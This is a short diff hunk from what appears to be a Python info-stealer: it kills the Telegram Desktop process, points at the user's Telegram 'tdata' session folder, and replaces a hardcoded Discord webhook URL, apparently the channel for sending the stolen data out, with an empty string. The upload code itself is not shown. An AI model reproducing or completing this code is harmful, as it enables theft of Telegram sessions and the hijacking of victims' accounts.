@@ -13,7 +13,7 @@ def kill_app(process_name):
 
 kill_app("Telegram.exe")
 
-discord_webhook_url = "https://discord.com/api/webhooks/1113092539931693136/_hqR3AE23ne9nRjdbfQpgDFbRN9lMKlR8ZvawMBgxeKlaMnaglhhViuWmKfXEtWRYqS3"
+discord_webhook_url = ""
 
 directory = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Telegram Desktop\\tdata"
 exclude_folder = "user_data"
